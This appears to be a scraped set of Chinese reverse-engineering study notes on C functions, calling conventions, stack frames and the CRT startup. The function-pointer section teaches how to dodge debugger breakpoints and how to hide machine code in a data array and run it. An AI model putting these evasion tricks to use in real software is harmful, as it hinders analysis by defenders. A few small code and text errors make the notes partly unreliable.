全局变量声明时如果没赋初始值，则为0（编译器做的）。 在编译时确定内存地址和宽度（宽度由类型决定）， 如果不重新编译，全局变量的内存地址不会变化。 就是平时所说的基址。 生命周期：程序一启动，直至程序结束。 作用域：进程作用域。 可以在任何其他函数里进行读写。 多个函数使用同一个全局变量，只要exe程序不结束，全局变量的值是最后一次修改的值。 反汇编识别： 1MOV 寄存器,byte/word/dword ptr ds:[0x12345678] //地址是进程空间的全局变量区，我这里随便写的12345678 通过寄存器的宽度，或者byte/word/dword 来判断全局变量的宽度 局部变量 局部变量是函数内部申请的，如果函数没有执行，那么局部变量没有内存空间。 推论：局部变量的内存是在堆栈中分配的，函数执行时才分配。而我们无法预知这个函数什么时候执行，也就意味着我们无法确定局部变量的内存地址。 没赋初值，那个地址编号存的内容就是之前被它人使用过的数据，俗称垃圾数据。 生命周期：函数被调用，函数调用结束。 作用域：函数作用域。 在A函数里无法使用函数B的局部变量。 反汇编识别 12345[ebp-4][ebp-8][ebp-0xC] 变量的作用域变量的作用域：变量在源码中可以被访问到的范围。类别含义例子进程作用域在整个进程中都被能访问到。全局变量文件作用域在当前源码文件内可以访问到静态变量函数作用域在函数内可以访问到局部变量块作用域只能在定义变量的&quot;{}&quot;块内访问 CE中搜数值，地址是绿色的表示是全局变量。"},{"title":"函数","path":"/wiki/C/函数.html","content":"函数格式 C语言中函数语法格式1234返回类型 函数名(参数列表)&#123;&#125; 返回类型、函数名不能省略 参数列表可以省略 例1234int plus(int x,int y)&#123; return 0;&#125; 函数名、参数名的命名规则: 只能以字母、数字、下划线组成，且第一个字母必须是字母或下划线 区分大小写 不能使用C语言的关链字 函数调用语法 汇编眼中的函数调用 调用形式1123push 参数1push 参数2call 内存地址 调用形式2123mov ecx,参数1mov edx,参数2call 内存地址 C语言眼中的函数调用 1函数名(参数1,参数2) 总结:函数名就是编译器起的内存地址的别名。 栈帧 堆栈帧(stack frame)(或活动记录（activation record)）是一块堆栈保留区域，用于存放被传递的实际参数、子程序的返回值、局部变量以及被保存的寄存器。当A函数内调用B函数时，就会开辟被调函数B所需的栈空间，形成函数B的栈帧。当函数B调用结束时，会清除它所使用的栈空间，关闭栈帧，这一过程称为栈平衡。 在上面的例子中，函数A是主调函数calling function，函数B是被调函数called function x86_debug汇编视角下函数固定的套路 函数的内存布局 变量、参数、返回值等的内存布局 EBP-4之上是局部变量区 EBP：原EBP的值 EBP+4：返回地址 EBP+8以下：参数 练习 使用裸函数实现add函数，体会C语言的函数是如何转换成汇编语言的(就是上面说的那些汇编指令) 1234567int add(int x,int y,int z)&#123;\tint a=2;\tint b=3;\tint c=4;\treturn x+y+z+a+b+c;&#125; 裸函数使用__declspec(naked)修饰函数后，编译器就不会替这个函数生成任何汇编指令，连ret都要自己使用内联汇编显式写出。1234567__declspec(naked) int add(int a, int b) &#123;\t__asm\t&#123; ret\t&#125;&#125;如果连ret都不写，调用这个函数时会出错，因为走到了int 3注意，只是函数内部什么都不生成，但是call前后，压参，外平栈（如果是外平栈），这些还是有的。12345678910111213__declspec(naked) int add(int a, int b) &#123;\t__asm\t&#123; ret\t&#125;&#125;int main()&#123;\tadd(1,2);\treturn 0;&#125; 答案注意：超过10以上的立即数前面加0x，表示十六进制。要不会被当成十进制12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;__declspec(naked) int add(int x,int y,int z)&#123;\t__asm\t&#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ss:[ebp-0x40] mov ecx,0x10 mov eax,0xCCCCCCCC rep stosd mov dword ptr [ebp-4],2 mov dword ptr [ebp-8],3 mov dword ptr [ebp-0xC],4 mov eax,dword ptr [ebp+8] add eax,dword ptr [ebp+0xC] add eax,dword ptr [ebp+0x10] add eax,dword ptr [ebp-4] add eax,dword ptr [ebp-8] add eax,dword ptr [ebp-0xC] pop edi pop esi pop ebx mov esp,ebp pop ebp ret\t&#125;&#125;int main(void)&#123;\tint result=add(1,2,3);\tprintf(&quot;%d&quot;,result);\treturn 0;&#125; 调用约定 参考链接🔗：关于调用约定(cdecl、fastcall、stcall、thiscall) 的一点知识 调用约定就是告诉编译器怎么传递参数，怎么传递返回值，怎么平衡堆栈。 这里列出常见的调用约定，其他的比如naked裸函数，在上面的练习题已做补充说明。当然，调用约定远不止这几个，有时你会发现代码复杂时，编译器生成的不是我们这里讲的这些调用约定，这些要在平时的代码分析时积累经验。 调用约定 参数传递方式 谁负责平栈？ 场景 cdecl 从右向左压栈 调用者calling function，外平栈 C/C++、MFC的默认方式；可变参数的函数 stdcall 从右向左压栈 被调方called function，内平栈 windows api调用约定 fastcall 函数第一个和第二个DWORD参数通过ecx和edx传递，其余参数按从右向左的顺序压栈 如果参数超过2个，用到堆栈传参了，才需要平栈。被调方called function，内平栈 速度快。但如果参数多，也用到堆栈传参，其实也加速不了多少 thiscall 从右向左入栈如果参数个数确定, this指针通过ecx传递给被调用者, 如果参数个数不确定, this指针在所有参数压栈后被压入堆栈 参数个数不定的, 调用者calling function清理堆栈 ，外平栈参数个数确定的，被调方called function，清理堆栈，内平栈 成员缺省调用约定 O2选项优化时，外平栈的调用方式可以采用复写传播优化，提高效率。 以加法函数为例，看不同函数调用方式下汇编指令的差异 cdecl调用约定stdcall调用约定fastcall调用约定thiscall调用约定123456789int add(int x,int y)\t//不加修饰默认就是C调用约定&#123;\treturn x+y;&#125;int __cdecl add(int x,int y)\t//明确指定用C调用约定&#123;\treturn x+y;&#125; 12345678910int add(int x,int y)&#123;\treturn x+y;&#125;int main(void)&#123;\tadd(1,2);\treturn 0;&#125; 12345678910int __stdcall add(int x,int y)&#123;\treturn x+y;&#125;int main(void)&#123;\tadd(1,2);\treturn 0;&#125; 12345678910int __fastcall add(int x,int y)&#123;\treturn x+y;&#125;int main(void)&#123;\tadd(1,2);\treturn 0;&#125; 上面这个两个数相加的例子，因为传递参数只有2个，都用了寄存器来传递参数，没用到堆栈传参，所以不需要平栈。 如果是4个参数，可以观察到内平栈。 12345678910int __fastcall add(int x,int y,int z,int a)&#123;\treturn x+y+z+a;&#125;int main(void)&#123;\tadd(1,2,3,4);\treturn 0;&#125; 参数个数确定不定参数（参数个数不确定）thiscall是唯一一个不能明确指明的函数修饰, 因为thiscall不是关键字. 它是C++类成员函数缺省的调用约定。 1234567891011121314151617struct A&#123; int x; int y; int add() &#123; return x + y; &#125;&#125;;int main(void)&#123; A a; int r = a.add(); return 0;&#125; 1234567891011121314151617181920212223242526272829#include &lt;cstdarg&gt;#include &lt;iostream&gt;class MyClass &#123;public: // 成员函数，计算不定数量参数的和 int sum(int count, ...) &#123; int result = 0; va_list args; va_start(args, count); // 初始化args指向第一个不定参数 for (int i = 0; i &lt; count; ++i) &#123; result += va_arg(args, int); // 获取下一个int类型的参数 &#125; va_end(args); // 清理args return result; &#125;&#125;;int main() &#123; MyClass obj; int result = obj.sum(4, 10, 20, 30, 40); // 调用sum函数 std::cout &lt;&lt; &quot;The result is: &quot; &lt;&lt; result &lt;&lt; std::endl; // 输出结果 return 0;&#125; 练习 将CallingConvention.exe逆向成C语言 答案12345678910111213141516171819202122232425int __stdccall AddThreeNum(int num1,int num2,int num3)&#123;\treturn num1+num2+num3;&#125;int __cdecl AddTwoNum(int num1,int num2)&#123;\treturn num1+num2;&#125;int __fastcall func(int num1,int num2,int num3,int num4,int num5)&#123;\tint x=num1; //1\tint y=num2; //3\tint result1=AddThreeNum(num3,y,x); //8\tint result2=AddTwoNum(x,y); //4\treturn AddTwoNum(result1,result2); //12&#125;int main(int argc,char* argv[])&#123;\tint result=func(1,3,4,6,7);\tprintf(&quot;%d&quot;,result);\treturn 0;&#125;放在VC++6.0中查看反汇编，和exe在OD中的汇编进行对比。除了有一些地方不一样，其余都一样。不一样的地方：调用AddThreeNum函数时的x和y不是从[EBP-4]和[EBP-8]处取，编译器在给x和y赋值后，又让[ESP-C]=1,[ESP-0x10]=3，从这两个地方取参数传给函数。然后后续的变量位置从[ebp-0x14]开始向上使用。1234567891011121314151617181920212223242526272829303132333435363738394041424344004010A0 push ebp004010A1 mov ebp,esp004010A3 sub esp,58h004010A6 push ebx004010A7 push esi004010A8 push edi004010A9 push ecx004010AA lea edi,[ebp-58h]004010AD mov ecx,16h004010B2 mov eax,0CCCCCCCCh004010B7 rep stos dword ptr [edi]004010B9 pop ecx004010BA mov dword ptr [ebp-8],edx004010BD mov dword ptr [ebp-4],ecx18: int x=num1; //1+004010C0 mov eax,dword ptr [ebp-4]+004010C3 mov dword ptr [ebp-0Ch],eax19: int y=num2; //3+004010C6 mov ecx,dword ptr [ebp-8]+004010C9 mov dword ptr [ebp-10h],ecx20: int result1=AddThreeNum(num3,y,x); //8+004010CC mov edx,dword ptr [ebp-0Ch]004010CF push edx+004010D0 mov eax,dword ptr [ebp-10h]004010D3 push eax004010D4 mov ecx,dword ptr [ebp+8]004010D7 push ecx004010D8 call @ILT+15(AddThreeNum) (00401014)004010DD mov dword ptr [ebp-14h],eax21: int result2=AddTwoNum(x,y); //4+004010E0 mov edx,dword ptr [ebp-10h]004010E3 push edx+004010E4 mov eax,dword ptr [ebp-0Ch]004010E7 push eax004010E8 call @ILT+0(AddTwoNum) (00401005)004010ED add esp,8004010F0 mov dword ptr [ebp-18h],eax22: return AddTwoNum(result1,result2); //12004010F3 mov ecx,dword ptr [ebp-18h]004010F6 push ecx004010F7 mov edx,dword ptr [ebp-14h]004010FA push edx004010FB call @ILT+0(AddTwoNum) (00401005)00401100 add esp,8 函数参数个数的分析 滴水三期，P19，2015-01-28，33:48-44:45 这里讲得很好，可以多听 通过前面的学习，我们判断函数参数个数的一般情况如下： 观察调用处的代码 1234push 3push 2push 1call 0040100f 继续观察平衡堆栈的代码 外平栈 12call 0040100fadd esp,0Ch 内平栈 1ret 4/8/0xC/0x10 综合上面两步的观察情况来确定参数个数 问题 参数传递未必都是通过堆栈，还可能是通过寄存器传的 函数调用处的代码看不到，比如可能是线程调的回调函数 看不到这块代码 1234567push ebxpush eaxmov ecx,dword ptr ds:[esi]mov edx,dword ptr ds:[edi]push 45push 33call 函数地址 那怎么分析？看函数内部。 下面说明分析步骤，假设看不到调用处的代码，只有如下的函数内部代码： 12345678910111213141516171819202122232400401050 push ebp00401051 mov ebp,esp00401053 sub esp,48h00401056 push ebx00401057 push esi00401058 push edi00401059 push ecx0040105A lea edi,[ebp-48h]0040105D mov ecx,12h00401062 mov eax,0CCCCCCCCh00401067 rep stos dword ptr [edi]00401069 pop ecx0040106A mov dword ptr [ebp-8],edx0040106D mov dword ptr [ebp-4],ecx00401070 mov eax,dword ptr [ebp-4]00401073 add eax,dword ptr [ebp-8]00401076 add eax,dword ptr [ebp+8]00401079 mov [g_x (00427958)],eax0040107E pop edi0040107F pop esi00401080 pop ebx00401081 mov esp,ebp00401083 pop ebp00401084 ret 4 观察步骤： 不考虑ebp、esp，只找给别人赋值的寄存器eax/ecx/edx/ebx/esi/edi 找到以后追查其来源，如果，该寄存器中的值不是在函数内存赋值的，那一定是传进来的参数。 公式一：寄存器 + ret 4 = 参数个数 公式二：寄存器 + [ebp+8] +[ebp+0x] = 参数个数 栈帧前面这段的指令套路不是一定的，debug或发布版会有差异。 12345678910111200401050 push ebp00401051 mov ebp,esp00401053 sub esp,48h00401056 push ebx00401057 push esi00401058 push edi00401059 push ecx0040105A lea edi,[ebp-48h]0040105D mov ecx,12h00401062 mov eax,0CCCCCCCCh00401067 rep stos dword ptr [edi]00401069 pop ecx 往下看，看到函数内部用了edx寄存器给别人赋值 10040106A mov dword ptr [ebp-8],edx 然后从这行代码往上看，看前面的代码，没看到在函数内部有对edx有赋值，那么edx一定是传进来的参数。 ecx同理。 由此，确定了由寄存器传递的参数个数，是2个。然后看堆栈平衡操作，看到 100401084 ret 4 所以堆栈传参个数是1个，加上寄存器传参，这个call函数一共3个参数。不过，在看了堆栈平衡操作的字节数后，可以在细致点，看函数内部使用到的堆栈参数[ebp+8]、[ebp+0x]来做二次确认。 总结 根据push个数（看不到也没关系）、平栈操作平了多少字节（有可能是用等价指令平栈）、函数内部用到了哪些参数，这些因素综合判断。 错误的： call前有几个push并不说明这个函数就是几个参数，因为经过编译器优化后的代码可能先push了，但是是下一个call才用到。 函数的返回值 在基本数据类型与sizeof(type)≤4的自定义类型（浮点类型除外）情况下，如果函数有返回值，是用eax作为返回值。如果大小大于4字节，用eax和edx来传递返回值。 函数返回类型 如何传递 char al short ax int eax 大小＞4字节 eax和edx。edx存储高位，eax存储高位 逆向经验之谈：单步步过一个call，观察eax变化。如果eax变了，说明这个call将一个数存到eax返回出来，然后紧接着分析这个eax存的东西代表什么含义 char类型的返回值short类型的返回值int类型的返回值大小＞4字节类型的返回值12345678910111213#include &lt;stdio.h&gt;char func()&#123; return 12;&#125;int main()&#123;\tchar result=func();\treturn 0;&#125; 12345678910111213#include &lt;stdio.h&gt;short func()&#123; return 12;&#125;int main()&#123;\tshort result=func();\treturn 0;&#125; 12这个常数就在硬编码中，offset的操作就是把0040103a这个地址的值取出，放入ax中 12345678910111213#include &lt;stdio.h&gt;int func()&#123; return 12;&#125;int main()&#123;\tint result=func();\treturn 0;&#125; 用数组或结构体就能自定义大小的数据类型。这里以long long类型演示当字节数&gt;4，eax存不下时，函数的返回值是如何返回的？ long long类型在VC6中对应的是__int64 12345678910111213#include &quot;stdafx.h&quot;__int64 func()&#123; return 0x1234567890;&#125;int main()&#123;\t__int64 result=func();\treturn 0;&#125; 高位：edx 低位：eax 局部变量也是，用edx存高位，eax存低位 参数传递 函数传递参数有两种方式：堆栈和寄存器。char和short类型还是通过4字节大小进行传参。 本机尺寸：如果本机是32位的，那么对32位的数据支持最好；如果是64位的，那么对64位的支持最好。 编译器遵守了本机尺寸这个规则，所以实际上char类型或者short类型的参数不但没有节省空间，反而浪费了多余的操作。 123456789101112131415#include &lt;stdio.h&gt;void func(char x, char y, char z)&#123; int r = x;&#125;int main()&#123; char a = 1; char b = 2; char c = 3; func(a, b, c); return 0;&#125; 虽然按4字节传（可以看到堆栈传参是03 CC CC CC），但用的时候还是按1字节用，所以不会出现传多了，使用错误的情况。 结论：整数类型的参数，一律使用int类型。 海哥说不使用char和short类型，实际上并不会节省空间，而且效率慢。但从另一个方面讲，出于使用规范角度考虑，还是用char和short类型吧。 实参和形参 理解汇编的，就知道下面的Plus函数为什么没修改到main函数中的变量x。 main函数中的x位于[ebp-4]，Plus函数的参数x在[ebp+8]。调用函数时，参数传递就是将上层函数的变量，或者表达式的值“复制一份”，传递给下层函数。 1234567891011121314151617#include &lt;stdio.h&gt;void Plus(int x)&#123; x = x + 1;&#125;// 入口函数int main(int argc, char *argv[])&#123; int x = 1; Plus(x); printf(&quot;%d &quot;, x); return 0;&#125; 局部变量的内存分配 一个未定义局部变量的函数，VC++下编译器为该函数分配的默认缓冲区大小是40h（不同编译器这个值不一样）。每多一个类型的变量就在40h的基础上再加上这个类型大小的空间（char类型和short类型，按4字节分配。） 函数中未定义局部变量函数中定义1个int类型变量函数中定义2个char类型局部变量，2个short类型局部变量，那么缓冲区大小是？12345678910111213#include &lt;stdio.h&gt;void Function()&#123;&#125;int main(int argc, char *argv[])&#123; Function(); return 0;&#125; 44h=默认40h+1个int类型大小的空间 12345678910111213#include &lt;stdio.h&gt;void Function()&#123; int x = 10;&#125;int main(int argc, char *argv[])&#123; Function(); return 0;&#125; 40h+4个4字节=50h 1234567891011121314151617#include &lt;stdio.h&gt;void Function()&#123; char a = 1; char b = 1; short c = 3; short d = 4;&#125;int main(int argc, char *argv[])&#123; Function(); return 0;&#125; 总结 小于32位的局部变量，空间在分配时，按32位分配。 使用时按实际的宽度使用。 不要定义char/short类型的局部变量。 参数与局部变量没有本质区别，都是局部变量，都在栈中分配。实在要说，参数是函数调用前分配的值，局部变量是函数执行时分配的值。 完全可以把参数当初局部变量使用 12345678910111213#include &lt;stdio.h&gt;void Function(int x, int y, int z)&#123; z = 10; // 不管传进来的值，直接把参数当局部变量用&#125;int main(int argc, char *argv[])&#123; Function(1, 2, 3); return 0;&#125;"},{"title":"内存分配与释放","path":"/wiki/C/内存分配与释放.html","content":"C语言提供了动态分配的方式，通过调用malloc函数，来按需申请指定大小的内存，然后使用，释放也要自己做，要不会内存泄露。申请的这块内存在堆区。 123void *malloc( size_t size); 参数：size，Bytes to allocate按字节大小去申请 返回值：返回void*型指针 malloc returns a void pointer to the allocated space, or NULL if there’s insufficient memory available. To return a pointer to a type other than void, use a type cast on the return value.Always check the return from malloc, even if the amount of memory requested is small. 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;int main(int argc, char *argv[])&#123; // 声明指针 int *ptr; // 在堆中申请内存，要128个int的空间 ptr = (int*)malloc(sizeof(int) * 128); //使用sizeof(类型)*n，来定义申请内存的大小 //malloc返回类型为void*类型，需要强制转换 // 无论申请多大的空间，一定要判断是否申请成功 if (ptr == NULL) &#123; return 0; &#125; // 初始化分配的内存空间 memset(ptr, 0, sizeof(int) * 128); // 使用部分的代码... *(ptr) = 1; // 使用完毕，要释放申请的堆空间 free(ptr); // 将指针设置为NULL。防止后面用到ptr导致出错 ptr = NULL; return 0;&#125;"},{"title":"函数指针","path":"/wiki/C/函数指针.html","content":"定义 函数指针变量定义的格式： 1返回类型 (调用约定 *变量名)(参数列表); 如： 1int (__cdecl *pFun)(int,int); 调用约定不写的话，用的是当前编译器默认的调用约定 指针特征 宽度 12345678910#include &quot;stdafx.h&quot;int main()&#123; int (*pFun)(int, int); printf(&quot;%d &quot;, sizeof(pFun)); return 0;&#125; 带*号宽度都是4 运算 之前提过，指针变量做++，–，+N，-N是取决于将指针变量去掉一个*号后的宽度。函数指针去掉一个*后变成了一个函数，没法确定这个函数的宽度，所以函数指针不能做++，–，+N，-N这些运算。编译会报错。 1234int(__cdecl *pFun)(int, int, int, int, int);//去掉一个*后int(__cdecl pFun)(int, int, int, int, int); 函数宽度没法确定什么意思 比如不同的两个函数，编译后都是一堆数。不同的函数宽度是不同的。不像之前学的别的指针类型，砍取一个*后宽度是确定的。 12345678910int Fun1(int x, int y)&#123; return x + y;&#125;int Fun2(int x, int y)&#123; int g = 1; return x + y + g;&#125; 相减 也不能相减。相减时要除一个宽度，但不同函数的宽度不同。 比较 可以做。 赋值与使用 pFun = (int(__cdecl *)(int, int))10 给函数指针类型的变量赋值时，确保类型一致，将10强转为int (__cdecl *)(int,int)类型 12345678910111213141516#include &quot;stdafx.h&quot;int main()&#123; // 定义函数指针变量 int(__cdecl *pFun)(int, int); // 为函数指针变量赋值 pFun = (int(__cdecl *)(int, int))10; //对10强转 // 使用函数指针变量 int r = pFun(1, 2); //定义函数指针变量时，返回类型是int，用一个int类型变量接收返回值 //定义函数指针变量时，参数列表是两个int，传两个int return 0;&#125; 看反汇编代码，可以看到编译器根据我们声明函数指针时的调用约定、返回类型、参数列表生成了相应的反汇编代码。 上述代码能编译，但不能执行。因为内存地址为10的地方是没有数据可以运行的。 pFun=函数名 传给pFun变量的函数，的参数，调用约定，返回值要和pFun声明的函数类型一致。如果不一致，做强转，即使编译通过，运行也会出错。 123456789101112131415#include &quot;stdafx.h&quot;int Function(int x, int y)&#123; return x + y;&#125;int main()&#123; int (*pFun)(int, int); pFun = Function; return 0;&#125; 12int r = Function(1, 2); // 函数原来这么调用的int r1 = pFun(1, 2); // 函数指针也一样 小结 函数指针用途：调用他人写好的函数。 常见场景：分析别人写的dll，弄清某个函数的功能、参数列表、返回类型等信息后，将函数的地址赋给函数指针，通过函数指针来调用这个函数。 函数指针，就是按照你要求的方式要调用你给的那个地址 函数指针应用 通过函数指针绕过断点 假设在一般情况下，我们写了一个程序，里边用了MessageBox函数，编译出了exe可执行文件。 12345678#include &lt;windows.h&gt; int main()&#123; MessageBox(0,0,0,0); return 0;&#125; 其他人拿到该exe后，可以在OD中用bp MessageBoxA下断，让程序跑起来，只要程序调用了MessageBox，那么就会因为刚才下的的断点停下来，这时，分析者再利用栈回溯功能，返回到上级调用者函数，逆向分析程序的功能。 我的环境编译出win_debug版的程序，拖到OD，bp MessageBoxA下断，不知道为啥是断在jmp那行，跑起来的话断不下来。所以通过Break Point界面双击来到jmp这行，按Enter，手动在77D5D7EA这个地址F2下普通断点，然后跑起来就会断下 我们来分析一下，bp MessageBoxA会在MessageBoxA函数头的mov edi,edi这行下断点，当程序执行时，跑到这里了，就会断下来。如果我们不经过这个断点，但仍能调用MessageBoxA，应该怎么做？可以发现，MessageBoxA函数里调用了一个函数MessageBoxExA，那么我们可以定义一个函数指针，通过函数指针调用MessageBoxExA。这样，我们的程序从77d5085C处开始执行，不会被77d5d7EA处的断点断下。 由调用处确定是5个参数 12345677D5081C |&gt; \\6A 00 push 0 ; /LanguageID = 0 (LANG_NEUTRAL)77D5081E |. FF75 14 push [arg.4] ; |Style77D50821 |. FF75 10 push [arg.3] ; |Title77D50824 |. FF75 0C push [arg.2] ; |Text77D50827 |. FF75 08 push [arg.1] ; |hOwner77D5082A |. E8 2D000000 call 77D5085C ; \\MessageBoxExA 通常windows api都是返回4个字节，所以这里返回值定义时定义为4个字节。 内平栈，不能用cdcall。 确定好这些信息后，函数指针的定义和赋值如下： 1234//定义函数指针类型的变量int (__stdcall *pFun)(int,int,int,int,int);//赋值 需要强转pFun = (int (__stdcall *)(int,int,int,int,int))0x77D5085C; 这个地址只适合我的实验环境。如果要写出通用的代码，需要PE结构的知识 1234567891011121314151617#include &lt;windows.h&gt; int main()&#123; //定义函数指针类型的变量 int (__stdcall *pFun)(int,int,int,int,int); //赋值 需要强转 pFun = (int (__stdcall *)(int,int,int,int,int))0x77D5085C; //正常方式调用 MessageBox(0,0,0,0); //通过函数指针调用 pFun(0,0,0,0,0); return 0;&#125; 编译出exe后，再次用bp MessageBoxA在MessageBoxA函数头的mov edi,edi这行下断点（77D507EA），执行程序，第一个MessageBox会被断下，第二个MessageBox不会被断下。 此时，破解者的应对方法： 进到MessageBoxExA，在该函数头的地方下断。 程序保护的人的应对方法：MessageBoxExA函数里调用了MessageBoxTimeoutA函数，定义函数指针，直接调用MessageBoxTimeoutA函数。 攻击者：对MessageBoxTimeoutA函数下断。 程序保护的人：看MessageBoxTimeoutA里调用了啥，再定义函数指针，直接调用更里边的函数。 所以，技术的对抗就是比谁更底层。 极端情况下，程序保护者，重写3环所有函数。此时破解者只能进到0环进行破解分析。 将代码隐藏到数据区 代码也是一堆数据。 写一个函数，看反汇编，将硬编码扣出来放到数组中。通过函数指针调用这个函数 1234int Function(int x, int y)&#123; return x + y;&#125; 12345678910111213141516171819202122232425262728293031323334353637#include &quot;stdafx.h&quot;//有符号数和无符号数，只有做大小比较和符号拓展时才有区别//所以这个数组定义成有符号或无符号都可以unsigned char code[] = &#123; 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x40, 0x53, 0x56, 0x57, 0x8D, 0x7D, 0xC0, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xF3, 0xAB, 0x8B, 0x45, 0x08, 0x03, 0x45, 0x0C, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3&#125;; int main(int argc, char* argv[]) &#123; typedef int (*Fun)(int,int); Fun p = (int (*)(int,int))&amp;code; int x = p(2,3); printf(&quot;%d &quot;,x); return 0;\t&#125; VS要申请可执行的页，在放硬编码。要不数据区不能执行。 现在函数在数据区中，破解者调试时没法下断点。"},{"title":"函数的入口","path":"/wiki/C/函数的入口.html","content":"参考 C++反汇编第一版，pdf 第二版，京东，https://cread.jd.com/read/startRead.action?bookId=30746348&amp;readType=1 记录：crt0.c源码文件：https://blog.csdn.net/daiyutage/article/details/17102261 程序的真正入口 main或Winmain函数是“语法规定的用户入口”，而不是“应用程序入口”。当用户双击执行一个位于磁盘上的程序后，操作系统会加载它，分析PE文件格式，分配相关资源，读取执行文件中的代码和数据到合适的内存单元，然后才执行入口代码，通常是[w]mainCRTStartup或[w]WinMainCRTStartup。在[w]mainCRTStartup或[w]WinMainCRTStartup里调用main或Winmain函数。不同编码和编程环境对应的启动启动函数如下表所示。 类别 控制台环境 Windows环境 多字节编码 mainCRTStartup WinMainCRTStartup Unicode编码 wmainCRTStartup wWinMainCRTStartup 在开发过程中，编译器也允许程序员自己指定入口函数。 VC++6.0的启动函数 在调试环境下，依次选择菜单View→Debug Windows→Call Stack打开出栈窗口（快捷键：Alt+7）。此窗口中显示了程序启动后，函数的调用流程。 在安装了完整版的VC++双击mainCRTStartup就能查看这个函数的源码。 环境问题完整版安装精简版+单独的CRT文件我从winworld下载的iso在xp上安装时卡在这一步，安装不成功，估计这个是完整版。https://winworldpc.com/product/microsoft-visual-stu/60https://www.zhihu.com/question/370249267从别的地方下的安装包能成功安装，但双击mainCRTStartup会让弹窗找我找crt0.c源文件，估计是精简版，没找到。根据Source code for mainCRTStartup() in Visual C++指明的路径%VSINSTALLDIR%VC\\crt\\src\\vcruntime\\，想办法找到源代码自己放进去。然后从CSDN上找到了，下载vc6.0中缺少的VC98\\CRT\\SRC文件夹，将其放到安装目录\\VC98\\下。这次再双击就能找到了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147/****BaseProcessStartup(PVOID Peb)**Purpose:* This routine does the C runtime initialization, calls main(), and* then exits. It never returns.**Entry:* PVOID Peb - pointer to Win32 Process Environment Block (not used)**Exit:* This function never returns.********************************************************************************/#ifdef _WINMAIN_#ifdef WPRFLAGvoid wWinMainCRTStartup(#else /* WPRFLAG */void WinMainCRTStartup(#endif /* WPRFLAG */#else /* _WINMAIN_ */#ifdef WPRFLAG//宽字符版控制台启动函数void wmainCRTStartup(#else /* WPRFLAG *///多字节版控制台启动函数void mainCRTStartup(#endif /* WPRFLAG */#endif /* _WINMAIN_ */ void )&#123; int mainret;#ifdef _WINMAIN_ _TUCHAR *lpszCommandLine; STARTUPINFO StartupInfo;#endif /* _WINMAIN_ */ /* * Get the full Win32 version，获取版本信息 */ _osver = GetVersion(); _winminor = (_osver &gt;&gt; 8) &amp; 0x00FF ; _winmajor = _osver &amp; 0x00FF ; _winver = (_winmajor &lt;&lt; 8) + _winminor; _osver = (_osver &gt;&gt; 16) &amp; 0x00FFFF ; //堆空间初始化过程，在此函数中，指定了程序中堆空间的起始地址 //_MT是多线程标记#ifdef _MT if ( !_heap_init(1) ) /* initialize heap */#else /* _MT */ if ( !_heap_init(0) ) /* initialize heap */#endif /* _MT */ fast_error_exit(_RT_HEAPINIT); /* write message and die */ //初始化多线程环境#ifdef _MT if( !_mtinit() ) /* initialize multi-thread */ fast_error_exit(_RT_THREAD); /* write message and die */#endif /* _MT */ /* * Guard the remainder of the initialization code and the call * to user&#x27;s main, or WinMain, function in a __try/__except * statement. */ __try &#123; _ioinit(); /* initialize lowio */#ifdef WPRFLAG //宽字符处理 /* get wide cmd line info */ _wcmdln = (wchar_t *)__crtGetCommandLineW(); //获取命令行信息 /* get wide environ info */ _wenvptr = (wchar_t *)__crtGetEnvironmentStringsW();//获取环境变量信息 _wsetargv(); _wsetenvp();#else /* WPRFLAG */ //多字节处理 /* get cmd line info */ _acmdln = (char *)GetCommandLineA(); //获取命令行信息 /* get environ info */ _aenvptr = (char *)__crtGetEnvironmentStringsA(); //获取环境变量信息 _setargv(); _setenvp();#endif /* WPRFLAG */ //初始化全局数据和浮点寄存器 _cinit(); /* do C data initialize *///窗口程序处理代码 #ifdef _WINMAIN_ StartupInfo.dwFlags = 0; GetStartupInfo( &amp;StartupInfo );#ifdef WPRFLAG lpszCommandLine = _wwincmdln(); mainret = wWinMain(#else /* WPRFLAG */ lpszCommandLine = _wincmdln(); mainret = WinMain(#endif /* WPRFLAG */ GetModuleHandleA(NULL), NULL, lpszCommandLine, StartupInfo.dwFlags &amp; STARTF_USESHOWWINDOW ? StartupInfo.wShowWindow : SW_SHOWDEFAULT );#else /* _WINMAIN_ *///调用wmain或main函数，传递命令行参数信息#ifdef WPRFLAG __winitenv = _wenviron; mainret = wmain(__argc, __wargv, _wenviron);#else /* WPRFLAG */ __initenv = _environ; mainret = main(__argc, __argv, _environ);#endif /* WPRFLAG */#endif /* _WINMAIN_ */ exit(mainret); //检查main函数返回值执行析构函数或atexit注册的函数指针，并结束程序 &#125; __except ( _XcptFilter(GetExceptionCode(), GetExceptionInformation()) ) &#123; /* * Should never reach here */ _exit( GetExceptionCode() ); &#125; /* end of try - except */&#125; 以VC++6.0控制台程序启动函数来解读启动函数的工作流程： GetVersion函数：获取当前运行平台的版本号。控制台程序运行在Windows模拟的DOS下，因此这里获取的版本号为MS-DOS的版本信息。 _heap_init函数：用于初始化堆空间。在函数实现中使用HeapCreate申请堆空间，申请空间的大小由_heap_init传递的参数决定。_sbh_heap_init函数用于初始化堆结构信息。 GetCommandLineA函数：获取命令行参数信息的首地址。 _crtGetEnvironmentStringsA函数：获取环境变量信息的首地址。 _setargv函数：此函数根据GetCommandLineA获取命令行参数信息的首地址并进行参数分析，将分离出的参数的个数保存在全局变量_argc中，将分析出的每个命令行参数的首地址存放在数组中，并将这个字符指针数组的首地址保存在全局变量_argv中。这样就得到了命令行参数的个数，以及命令行参数信息。 _setenvp函数：此函数根据_crtGetEnvironmentStringsA函数获取环境变量信息的首地址并进行分析，将得到的每条环境变量字符串的首地址存放在字符指针数组中，并将这个数组的首地址存放在全局变量env中。得到main函数所需的三个参数信息之后，当调用main函数时，便可以将_argc、_argv、env这三个全局变量作为参数，以栈传参方式传递到main函数中。 